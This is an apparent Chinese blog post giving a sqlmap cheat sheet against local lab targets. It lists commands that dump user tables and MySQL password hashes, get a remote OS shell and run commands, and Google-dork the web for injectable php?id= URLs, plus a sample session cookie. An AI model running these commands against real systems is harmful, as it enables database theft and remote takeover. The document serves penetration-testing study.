---
title: sqmap simple intro
top: false
cover: false
toc: true
mathjax: true
date: 2019-09-12 22:14:36
password:
summary:
tags:
categories:
---

## 常用命令
```
./sqlmap.py -u "http://localhost:88/vulnerabilities/sqli/?id=1&Submit=Submit#" –cookie=mycookice.txt –batch
./sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D sql_inject_demo -T t_user –columns
./sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump
./sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D mysql -T user -C ‘user, authentication_string’ –dump
./sqlmap.py -u "http://127.0.0.1/index.php?id=1" –os-shell // 获取远程主机的shell
./sqlmap.py -u "http://127.0.0.1/index.php?id=1" –os-cmd="whoami" // 执行远程主机的命令
./sqlmap.py -u "http://127.0.0.1/index.php?id=1" –is-dba // 检查DBMS用户是否为DBA
./sqlmap.py -g "inurl:php?id=" // 通过google寻找url带有php?id=字段的地址
```

**参数解析**
–batch –dbs //showdatabases
–batch –current-db //showcurrentdb
–batch -D database -T user -C varchar–tables //showtables
–columns //showcolumns
–tables //thesame

__以GET方式的cookice形式:__
_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low

__POST注入方式:__
$ python sqlmap.py -r header.txt –dbs
// -r是从一个文件中载入HTTP请求
// 其余都与GET一样将-u部分改成-r header.txt
从chrome保存下来的request header:
POST /index.php HTTP/1.1 ...
